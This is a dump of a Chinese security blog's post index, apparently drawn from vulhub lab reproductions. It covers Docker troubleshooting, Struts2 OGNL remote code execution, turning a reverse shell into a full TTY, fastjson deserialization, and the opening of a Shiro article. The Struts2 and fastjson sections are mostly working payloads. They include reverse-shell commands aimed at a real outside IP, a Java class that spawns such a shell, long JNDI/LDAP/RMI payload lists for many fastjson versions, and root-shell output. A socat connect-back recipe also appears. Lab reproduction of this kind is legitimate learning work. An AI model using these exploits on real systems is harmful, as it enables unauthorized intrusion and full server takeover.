    "content"  : "网上有很多关于vulhub的docker构建教程，就不重复造轮子了。记录一些日常使用dokcer遇到的问题docker常用连接重置BurpSuiteProfessionalErrorConnectionreset当前无法使用此页面当前无法处理此请求。HTTPERROR503之前做一个struts2/s2-057的漏洞复现，因为是自己的服务器就各种造，扫描器什么的一把梭。最后靶场被玩儿坏了。尝试能不能重装镜像解决:(这里我随便拿了一个镜像举列子dockerimagesREPOSITORYTAGIMAGEIDCREATEDSIZExdebug-rce_phplatest6026f10530db3daysago393MBvulhub/php7.1.12-apache10fffe5b286c2yearsago392MBvulhub/tomcat8.566ba03f6c1d83yearsago367MBvulhub/tomcat8.0458575a05d973yearsago357MB删除本地镜像dockerrmi6026f10530dbUntagged:xdebug-rce_php:latestDeleted:sha256:6026f10530db39c61d31e0461ccbff4786e8c604c34f8ff8167d7ac89c81446aDeleted:sha256:4ce36271980f0f494e1a935bdaced37ea38d08fb167d54c50440fc009df315f9Deleted:sha256:d43d3fbbbb36edd2dbedd5df458789c7c57b5fd366403830bb6ac01b42b743d7Deleted:sha256:b15d563c13eccd51017c2bfa269f322744cb476c4c62749d5356cd0069d6391d如果报错提示无法删除，大概率情况下是指定删除的镜像docker内在运行，直接停止就行。dockerrm6026f10530db：删除已停止的容器dockerrm-f6026f10530db：删除正在运行的容器进入容器执行命令重要的是CONTAINERID值，执行dockerps查看就可以：sudodockerexec-it775c7c9ee1e1/bin/bash报错：goinstall:noinstalllocationfordirectoryoutsideGOPATH:参考：https://stackoverflow.com/questions/26134975/go-install-no-install-location-for-directory-outside-gopath进入容器后就可以直接执行命令，ifconfig：br-4c7c2091db92:flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;mtu1500inet172.24.0.1netmask255.255.0.0broadcast172.24.255.255inet6fe80::42:b7ff:feb7:f51dprefixlen64scopeid0x20&lt;link&gt;ether02:42:b7:b7:f5:1dtxqueuelen0(Ethernet)RXpackets46bytes4538(4.4KiB)RXerrors0dropped0overruns0frame0TXpackets65bytes4778(4.6KiB)TXerrors0dropped0overruns0carrier0collisions0docker0:flags=4099&lt;UP,BROADCAST,MULTICAST&gt;mtu1500inet172.18.0.1netmask255.255.0.0broadcast172.18.255.255inet6fe80::42:94ff:feb9:c3dcprefixlen64scopeid0x20&lt;link&gt;ether02:42:94:b9:c3:dctxqueuelen0(Ethernet)RXpackets1602494bytes995390708(949.2MiB)RXerrors0dropped0overruns0frame0TXpackets1434833bytes872808706(832.3MiB)TXerrors0dropped0overruns0carrier0collisions0eth0:flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;mtu1500inet172.17.185.134netmask255.255.240.0broadcast172.17.191.255inet6fe80::216:3eff:fe03:a170prefixlen64scopeid0x20&lt;link&gt;ether00:16:3e:03:a1:70txqueuelen1000(Ethernet)RXpackets6405140bytes5419609300(5.0GiB)RXerrors0dropped0overruns0frame0TXpackets4733596bytes1372915223(1.2GiB)TXerrors0dropped0overruns0carrier0collisions0lo:flags=73&lt;UP,LOOPBACK,RUNNING&gt;mtu65536inet127.0.0.1netmask255.0.0.0inet6::1prefixlen128scopeid0x10&lt;host&gt;looptxqueuelen1000(LocalLoopback)RXpackets20372bytes1792815(1.7MiB)RXerrors0dropped0overruns0frame0TXpackets20372bytes1792815(1.7MiB)TXerrors0dropped0overruns0carrier0collisions0veth382577a:flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;mtu1500inet6fe80::b067:b9ff:fece:612bprefixlen64scopeid0x20&lt;link&gt;etherb2:67:b9:ce:61:2btxqueuelen0(Ethernet)RXpackets46bytes5182(5.0KiB)RXerrors0dropped0overruns0frame0TXpackets83bytes6263(6.1KiB)TXerrors0dropped0overruns0carrier0collisions0iptable：iptables-L#Warning:iptables-legacytablespresent,useiptables-legacytoseethemChainINPUT(policyACCEPT)targetprotoptsourcedestinationChainFORWARD(policyACCEPT)targetprotoptsourcedestinationDOCKER-USERall--anywhereanywhereDOCKER-ISOLATION-STAGE-1all--anywhereanywhereACCEPTall--anywhereanywherectstateRELATED,ESTABLISHEDDOCKERall--anywhereanywhereACCEPTall--anywhereanywhereACCEPTall--anywhereanywhereACCEPTall--anywhereanywherectstateRELATED,ESTABLISHEDDOCKERall--anywhereanywhereACCEPTall--anywhereanywhereACCEPTall--anywhereanywhereChainOUTPUT(policyACCEPT)targetprotoptsourcedestinationChainDOCKER(2references)targetprotoptsourcedestinationACCEPTtcp--anywhere172.24.0.2tcpdpt:http-altChainDOCKER-ISOLATION-STAGE-1(1references)targetprotoptsourcedestinationDOCKER-ISOLATION-STAGE-2all--anywhereanywhereDOCKER-ISOLATION-STAGE-2all--anywhereanywhereRETURNall--anywhereanywhereChainDOCKER-USER(1references)targetprotoptsourcedestinationRETURNall--anywhereanywhereChainDOCKER-ISOLATION-STAGE-2(2references)targetprotoptsourcedestinationDROPall--anywhereanywhereDROPall--anywhereanywhereRETURNall--anywhereanywhere"
  },

  {
    "title"    : "「Struts2」:Apache-Struts2框架漏洞复现",
    "category" : "",
    "tags"     : "vulnhub, 漏洞复现, CVE, 笔记",
    "url"      : "/blog/2020/structs-2-vuln-poc/",
    "date"     : "May 26, 2020",
    "content"  : "s2-001struts2-001该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用OGNL表达式%{value}进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用%{value}对提交的数据执行了一次OGNL表达式解析，所以可以直接构造Payload进行命令执行。影响版本：Struts2.0.0-Struts2.0.8payload代码%25{#a=(newjava.lang.ProcessBuilder(newjava.lang.String[]{\"whoami\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=newjava.io.InputStreamReader(#b),#d=newjava.io.BufferedReader(#c),#e=newchar[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(newjava.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}发送回包回显如下：payload的注入命令whoami下方页面显示回显root，执行成功。&lt;!DOCTYPEhtmlPUBLIC\"-//W3C//DTDHTML4.01Transitional//EN\"\"http://www.w3.org/TR/html4/loose.dtd\"&gt;&lt;html&gt;&lt;head&gt;&lt;metahttp-equiv=\"Content-Type\"content=\"text/html;charset=UTF-8\"&gt;&lt;title&gt;S2-001&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;S2-001Demo&lt;/h2&gt;&lt;p&gt;link:&lt;ahref=\"https://struts.apache.org/docs/s2-001.html\"&gt;https://struts.apache.org/docs/s2-001.html&lt;/a&gt;&lt;/p&gt;\t\t\t&lt;formid=\"login\"name=\"login\"onsubmit=\"returntrue;\"action=\"/login.action\"method=\"post\"&gt;&lt;tableclass=\"wwFormTable\"&gt;\t&lt;tr&gt;&lt;tdclass=\"tdLabel\"&gt;&lt;labelfor=\"login_username\"class=\"label\"&gt;username:&lt;/label&gt;&lt;/td&gt;&lt;td&gt;&lt;inputtype=\"text\"name=\"username\"value=\"asdadas\"id=\"login_username\"/&gt;&lt;/td&gt;&lt;/tr&gt;rootpayload1:%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22whoami%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7Dpayload2(getshell):%25{#a=(newjava.lang.ProcessBuilder(newjava.lang.String[]{\"ping\",\"dnslog.cn\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=newjava.io.InputStreamReader(#b),#d=newjava.io.BufferedReader(#c),#e=newchar[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(newjava.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}%25{#a=(newjava.lang.ProcessBuilder(newjava.lang.String[]{\"/bin/bash\",\"-c\",\"/bin/bash-i&gt;&amp;/dev/tcp/47.52.233.92/123410&gt;&amp;1\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=newjava.io.InputStreamReader(#b),#d=newjava.io.BufferedReader(#c),#e=newchar[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(newjava.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}--------------------+--------------------+以下是使用payload，实测能够十分有效的进行各种poc代码注入，使用url编码效果更佳。%25{#a=(newjava.lang.ProcessBuilder(newjava.lang.String[]{\"/bin/bash\",\"-c\",\"/bin/bash-i&gt;&amp;/dev/tcp/47.52.233.92/123410&gt;&amp;1\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=newjava.io.InputStreamReader(#b),#d=newjava.io.BufferedReader(#c),#e=newchar[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(newjava.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}nc-lvnp12341Listeningon0.0.0.012341Connectionreceivedon120.242.209.22417321bash:cannotsetterminalprocessgroup(1):Inappropriateioctlfordevicebash:nojobcontrolinthisshellroot@9485ca31e963:/usr/local/tomcat#iduid=0(root)gid=0(root)groups=0(root)s2-013?url=%24%7B%28%23_memberAccess%5B\"allowStaticMethodAccess\"%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read%28%23d%29%2C%23out%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23out.println%28%23d%29%2C%23out.close%28%29%29%7Dstruts2-dev-modedebug=command&amp;expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23a%3d@java.lang.Runtime@getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2c%23b%3dnewjava.io.InputStreamReader%28%23a%29%2c%23c%3dnewjava.io.BufferedReader%28%23b%29%2c%23d%3dnewchar%5b50000%5d%2c%23c.read%28%23d%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23d%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29s2-057影响版本:&lt;=Struts2.3.34,Struts2.5.16访问http://localhost:8080/${(111+111)}/actionChain1.actionRequst包GET/$%7B(111+111)%7D/actionChain1.actionHTTP/1.1Host:vuln_s2_ip:8080DNT:1Upgrade-Insecure-Requests:1User-Agent:Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/83.0.4103.61Safari/537.36Edg/83.0.478.37Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding:gzip,deflateAccept-Language:zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie:JSESSIONID=6567848243F5C10BA42DA6C8222FFC32Connection:close+------------------------++------------------------++------------------------++------------------------++------------------------++------------------------+Response包：HTTP/1.1302Location:/222/register2.actionContent-Length:0Date:Wed,27May202006:21:06GMTConnection:close我们看到${(111+111)}表达式已经被计算"
  },

  {
    "title"    : "「BASH」:谈谈完全交互式的终端",
    "category" : "",
    "tags"     : "BASH, 笔记",
    "url"      : "/blog/2020/how-to-get-TTY-terminal-in-linux/",
    "date"     : "May 20, 2020",
    "content"  : "写在前面，本方法适用于在反弹shell后把shell提升为完全交互式shell，也是自己实战了一段时间后摸索出来的，记一下笔记完美的交互式shellpython$python-c\"importpty;pty.spawn('/bin/bash')\"#输入Ctrl+Z$sttyraw-echo$fg$reset$exportSHELL=bash#orexportTERM=xterm-256colorsrciptbasedonbash同样的，我在网上也找到另外一种方式：script/dev/null/这样：同理，也可以通过同样的方式获取到交互式shell：script/dev/nullCtrl-Zsttyraw-echofgreset这样我们在终端某个命令时，输入ctrl+c或者ctrl+z就不会直接中断shell。这里转载搜到信息来进行展示，供大家参考：stty-echo\t#禁止回显，当在键盘上输入时，并不出现在屏幕上sttyecho\t#打开回显sttyraw\t#设置原始输入stty-raw\t#关闭原始输入bg\t\t\t#将一个在后台暂停的命令，变成继续执行fg\t\t\t#将后台中的命令调至前台继续运行jobs\t\t#查看当前有多少在后台运行的命令ctrl+z\t\t#可以将一个正在前台执行的命令放到后台，并且暂停clear\t\t#这个命令将会刷新屏幕，本质上只是让终端显示页向后翻了一页，如果向上滚动屏幕还可以看到之前的操作信息。reset\t\t#这个命令将完全刷新终端屏幕，之前的终端输入操作信息将都会被清空来源：实现交互式shell的几种方式socat目标机把socat上传到目标机器上或者直接下载$wgethttps://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat-O/tmp/socatvuln_ip:chmod+x/tmp/socat./tmp/socatexec:'bash-li',pty,stderr,setsid,sigint,sanetcp:47.52.233.92:4444--attackmachinesocatfile:`tty`,raw,echo=0tcp-listen:4444stty行列数:)有的时候终端写入的命令太长，而终端行列不够长来显示所以会导致命令重叠、错杂，我们可以用下面的方法来让我们用这个shell用的更舒服点；先看看自己机器上的stty配置信息:root@ubuntu20-free:~#stty-aspeed9600baud;rows35;columns148;line=0;intr=^C;quit=^\\;erase=^?;kill=^U;eof=^D;eol=&lt;undef&gt;;eol2=&lt;undef&gt;;swtch=&lt;undef&gt;;start=^Q;stop=^S;susp=^Z;rprnt=^R;werase=^W;lnext=^V;discard=^O;min=1;time=0;-parenb-parodd-cmsparcs8-hupcl-cstopbcread-clocal-crtscts-ignbrk-brkint-ignpar-parmrk-inpck-istrip-inlcr-igncricrnlixon-ixoff-iuclc-ixany-imaxbel-iutf8opost-olcuc-ocrnlonlcr-onocr-onlret-ofill-ofdelnl0cr0tab0bs0vt0ff0isigicanoniextenechoechoeechok-echonl-noflsh-xcase-tostop-echoprtechoctlechoke-flusho-extprocspeed9600baud;rows35;columns148;line=0;这一段是我们所需要的信息；rows35;columns148配置我们的shell如下：$sttyrows35cols148其他痛点有的时候感觉terminal上太多命令了，用着用着会习惯性输入命令clear，然后你们就会看到如下现象：#clearTERMenvironmentvariablenotset.#set|grepTERMTERM=dumb如上，看term的配置信息，最后解决办法如下，设置term为xterm就可以了。#exportTERM=xterm#set|grepTERMTERM=xterm_=TERM之后就可以随意的clear清除命令辣！"
  },

  {
    "title"    : "「fastjson」:浅谈json的反序列化",
    "category" : "",
    "tags"     : "漏洞复现, 笔记, vulnhub, Sql-Inject",
    "url"      : "/blog/2020/fastjson-Deserialization-poc/",
    "date"     : "May 19, 2020",
    "content"  : "fastjson指纹特征访问页面，查看反包是一个指定的json格式的数据。请求包：GET/HTTP/1.1Host:underattack-host:8090Cache-Control:max-age=0DNT:1Upgrade-Insecure-Requests:1User-Agent:Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/81.0.4044.138Safari/537.36Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding:gzip,deflateAccept-Language:zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection:close反包：HTTP/1.1200Content-Type:application/json;charset=UTF-8Content-Length:28Date:Tue,19May202001:05:29GMTConnection:close{\"age\":25,\"name\":\"Bob\"}如上的请求和反包。我们知道了json的格式直接构造参数，给服务器发包看看：POST/HTTP/1.1Host:underattack-host:8090Cache-Control:max-age=0DNT:1Upgrade-Insecure-Requests:1Content-Type:application/jsonUser-Agent:Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/81.0.4044.138Safari/537.36Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding:gzip,deflateAccept-Language:zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection:closeContent-Length:26{\"name\":\"hello\",\"age\":20}反包：HTTP/1.1200Content-Type:application/json;charset=UTF-8Content-Length:30Date:Tue,19May202001:06:20GMTConnection:close{\"age\":20,\"name\":\"hello\"}我们看到服务器端返回包为我们构造的包。fastjson1.2.24反序列化导致任意命令执行漏洞fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。参考资料：浅谈FastjsonRCE漏洞的绕过史fastjson远程反序列化poc的构造和分析首先编译并上传命令执行代码##catdnslog.javaimportjava.lang.Runtime;importjava.lang.Process;publicclassdnslog{static{try{Runtimert=Runtime.getRuntime();String[]commands={\"/bin/sh\",\"-c\",\"pinguser.`whoami`.c08aqu.dnslog.cn\"};Processpc=rt.exec(commands);pc.waitFor();}catch(Exceptione){//donothing}}}编译：javacdnslog.java。生成class文件；然后我们借助marshalsec项目，启动一个RMI服务器，监听9999端口，并指定受害机器访问9999端口后，去加载远程服务器的类dnslog.class，而class文件就是执行command。gitclonehttps://github.com/mbechler/marshalsec.gitcdmarshalsecmvncleanpackage-DskipTests##看到BUILDSUCCESS后进入targetcdtargetjava-cpmarshalsec-0.0.3-SNAPSHOT-all.jarmarshalsec.jndi.RMIRefServer\"https://www.chihou.pro/##dnslog\"9999*OpeningJRMPlisteneron9999开启监听。向靶场服务器发送Payload，带上RMI的地址：##POST数据{\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://47.52.233.92:9999/dnslog\",\"autoCommit\":true}}##返回{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://47.52.233.92:9999/expUseful\",\"autoCommit\":true}}发送完毕后检查RMI服务器的监听记录：*OpeningJRMPlisteneron9999Haveconnectionfrom/61.133.171.114:11430Readingmessage...IsRMI.lookupcallfordnslog2Sendingremoteclassloadingstubtargetinghttps://www.chihou.pro/dnslog.classClosingconnection受害机器已经访问了我们的服务器，最后检查是否执行dnslog命令；user.root.c08aqu.dnslog.cn61.132.161.122020-08-1415:43:30user.root.c08aqu.dnslog.cn61.132.161.52020-08-1415:43:30user.root.c08aqu.dnslog.cn61.132.161.122020-08-1415:43:30user.root.c08aqu.dnslog.cn61.132.161.52020-08-1415:43:30可见，ping命令已成功执行;反弹shell同样的，直接在poc代码里修改反弹shell的代码即可。importjava.lang.Runtime;importjava.lang.Process;publicclassnc{static{try{Runtimert=Runtime.getRuntime();String[]commands={\"/bin/bash\",\"-c\",\"bash-i&gt;&amp;/dev/tcp/47.52.233.92/123410&gt;&amp;1\"};Processpc=rt.exec(commands);pc.waitFor();}catch(Exceptione){//no}}}同理即可获得反弹shell：##nc-lvnp12341Listeningon0.0.0.012341Connectionreceivedon120.242.209.703450bash:cannotsetterminalprocessgroup(1):Inappropriateioctlfordevicebash:nojobcontrolinthisshellroot@5a8812147218:/##whoamiwhoamirootdnslogpayload{\"rand1\":{\"@type\":\"java.net.InetAddress\",\"val\":\"http://dnslog\"}}{\"rand2\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"http://dnslog\"}}{\"rand3\":{\"@type\":\"java.net.Inet6Address\",\"val\":\"http://dnslog\"}}{\"rand4\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"http://dnslog\"}}}{\"rand5\":{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}}##一些畸形payload，不过依然可以触发dnslog：{\"rand6\":{\"@type\":\"com.alibaba.fastjson.JSONObject\",{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}}\"\"}}{\"@type\":\"java.lang.AutoCloseable\"{\"rand7\":Set\\[{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}\\]}{\"rand8\":Set\\[{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}{\"rand9\":{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}{\"@type\":\"java.lang.AutoCloseable\"{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://47.52.233.92:9999/expUseful\",\"autoCommit\":true}}{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://47.52.233.92:9999/expUseful\",\"autoCommit\":true}一些其他版本的payload1.2.41##直接加[是不可以的，因为数组实例化的是Object类型，所以需要将传入的变量设置为数组格式，然后在##com.alibaba.fastjson.serializer.ObjectArrayCodec中通过数组对象的getComponentType()##可以获得数组元素即com.sun.rowset.JdbcRowSetImpl对象{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://47.52.233.92:9999/expUseful\",\"autoCommit\":true}{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"ldap://47.52.233.92:9999/expUseful\",\"autoCommit\":true]}1.2.42{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://47.52.233.92:9999/expUseful\",\"autoCommit\":true}//原来在41版本的[还能用{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"ldap://47.52.233.92:9999/expUseful\",\"autoCommit\":true]}1.2.43{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://47.52.233.92:9999/expUseful\"}}1.2.45{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://47.52.233.92:9999/expUseful\"}}1.2.47{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://47.52.233.92:9999/expUseful\",\"autoCommit\":true}}}{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://47.52.233.92:9999/expUseful\",\"autoCommit\":true}}}1.2.60{\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\",\"prefix\":\"ldap://47.52.233.92:9999/expUseful\"}{\"@type\":\"oracle.jdbc.connector.OracleManagedConnectionFactory\",\"xaDataSourceName\":\"ldap://47.52.233.92:9999/expUseful\"}{\\\"@type\\\":\\\"oracle.jdbc.connector.OracleManagedConnectionFactory\\\",\\\"xaDataSourceName\\\":\\\"rmi://10.10.20.166:1099/ExportObject\\\"}{\\\"@type\\\":\\\"org.apache.commons.configuration.JNDIConfiguration\\\",\\\"prefix\\\":\\\"ldap://10.10.20.166:1389/ExportObject\\\"}{\\\"@type\\\":\\\"org.apache.commons.configuration2.JNDIConfiguration\\\",\\\"prefix\\\":\\\"rmi://127.0.0.1:1099/Exploit\\\"}\"1.2.62{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"rmi://127.0.0.1:1099/exploit\"}1.2.66{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://47.52.233.92:9999/expUseful\"}{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://47.52.233.92:9999/expUseful\"}{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\"jndiNames\":\"ldap://47.52.233.92:9999/expUseful\"}{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\":{\"@type\":\"java.util.Properties\",\"UserTransaction\":\"ldap://47.52.233.92:9999/expUseful\"}}RMI{\"@type\":\"LLcom.sun.rowset.RowSetImpl;;\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}1.2.42{\"@type\":\"[com.sun.rowset.RowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}1.2.25v1.2.43{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\"：\"data_source\":\"rmi://localhost:1099/Exploit\"}}1.2.25{\"@type\":\"Lcom.sun.rowset.RowSetImpl;\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}{\\\"@type\\\":\\\"com.zaxxer.hikari.HikariConfig\\\",\\\"metricRegistry\\\":\\\"rmi://127.0.0.1:1099/Exploit\\\"}1.2.60{\\\"@type\\\":\\\"org.apache.commons.configuration.JNDIConfiguration\\\",\\\"prefix\\\":\\\"rmi://127.0.0.1:1099/Exploit\\\"}1.2.60{\\\"@type\\\":\\\"org.apache.commons.configuration2.JNDIConfiguration\\\",\\\"prefix\\\":\\\"rmi://127.0.0.1:1099/Exploit\\\"}1.2.61{\\\"@type\\\":\\\"org.apache.xbean.propertyeditor.JndiConverter\\\",\\\"asText\\\":\\\"rmi://localhost:1099/Exploit\\\"}1.2.62{\\\"@type\\\":\\\"br.com.anteros.dbcp.AnterosDBCPConfig\\\",\\\"healthCheckRegistry\\\":\\\"rmi://localhost:1099/Exploit\\\"}AnterosDBCPConfig{\\\"@type\\\":\\\"br.com.anteros.dbcp.AnterosDBCPConfig\\\",\\\"metricRegistry\\\":\\\"rmi://localhost:1099/Exploit\\\"}AnterosDBCPConfig{\\\"@type\\\":\\\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\\\",\\\"properties\\\":{\\\"UserTransaction\\\":\\\"rmi://localhost:1099/Exploit\\\"}}JtaTransactionConfig"
  },

  {
    "title"    : "ShiroDeser",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/ShiroDeser/",
    "date"     : "May 18, 2020",
    "content"  : "ShiroDeser写在文前：本文是我自己在实践中的一些理解和经历，希望能够记录下来；第一小结是后期在自己对这个框架有一定的认知后做的总结，修改记录可以看下面，第二小结是在学习中在网上的一些学习过程，当时也记录下来了。故此分为两个小结。——致勤奋的所有人不一样的SHIRO框架浅析思路梳理   SHIRO框架简介以及相关用途反序列化分析为什么写这样的代码反序列化实战✅简介：关于SHIRO的历史和相关实现组件✅JAVA代码反序列化FRAMES❎开发者写这样代码的用意✅利用GADGET生成COOKIE✅用途：SHIRO框架的使用场景和解决痛点✅调试环境部署❎开发者如何修复✅最终目标：GETSHELL本文初次记于2020/05/18；一次修改于2021/01/04上午；添加了文章目录；在原先文章基础不变的情况下，调整了整体文章的阐述框架，添加如下：技术分析；开发分析。零：Shiro框架的简介和相关用途ApacheShiro（读作“sheeroh”，即日语“城”）是一个开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。————来自于维基百科0x01：简介Shiro三个核心组件：Subject,SecurityManager和Realms.Subject：即“当前操作用户”。但是，在Shiro中，Subject这一概念并不仅仅指人，也可以是第三方进程、后台帐户（DaemonAccount）或其他类似事物。它仅仅意味着“当前跟软件交互的东西”。Subject代表了当前用户的安全操作，SecurityManager则管理所有用户的安全操作。SecurityManager：它是Shiro框架的核心，典型的Facade模式，Shiro通过SecurityManager来管理内部组件实例，并通过它来提供安全管理的各种服务。Realm：Realm充当了Shiro与应用安全数据间的“桥梁”或者“连接器”。也就是说，当对用户执行认证（登录）和授权（访问控制）验证时，Shiro会从应用配置的Realm中查找用户及其权限信息。从这个意义上讲，Realm实质上是一个安全相关的DAO：它封装了数据源的连接细节，并在需要时将相关数据提供给Shiro。当配置Shiro时，你必须至少指定一个Realm，用于认证和（或）授权。配置多个Realm是可以的，但是至少需要一个。Shiro内置了可以连接大量安全数据源（又名目录）的Realm，如LDAP、关系数据库（JDBC）、类似INI的文本配置资源以及属性文件等。如果系统默认的Realm不能满足需求，你还可以插入代表自定义数据源的自己的Realm实现。0x02：用途ApacheShiro是Java的一个安全框架。Shiro可以非常容易的开发出足够好的应用，其不仅可以用在JavaSE环境，也可以用在JavaEE环境，Shiro可以帮助我们完成：认证、授权、加密、会话管理、与Web集成、缓存等。上面说的比较官方一点，我们可以简单一点理解，她就是一个开源的集成权限框架，这是我们在市面上很多的应用。我们在漏洞挖掘的过程中，如果存在WEB验证机制，有可能会存在登录绕过，所以现在很多j2ee开发都会采用shiro框架来做权限控制，框架的优势是十分明显的，但凡事有利有弊，有优势当然就存在劣势。shiro是我在参加工作后才会慢慢去接触到；从一开始的代审，再到黑盒渗透，再到前一段时间刚结束的HW行动。目前，使用ApacheShiro的人越来越多，因为它相当简单，对比SpringSecurity，可能没有SpringSecurity做的功能强大，但是在实际工作时可能并不需要那么复杂的东西，所以使用小而简单的Shiro就足够了。对于它俩到底哪个好，这个不必纠结，能更简单的解决项目问题就好了。一：Shiro框架反序列化的原因1x01：Shiro代码层分析web.xml&lt;welcome-file-list&gt;&lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt;&lt;/welcome-file-list&gt;代码大致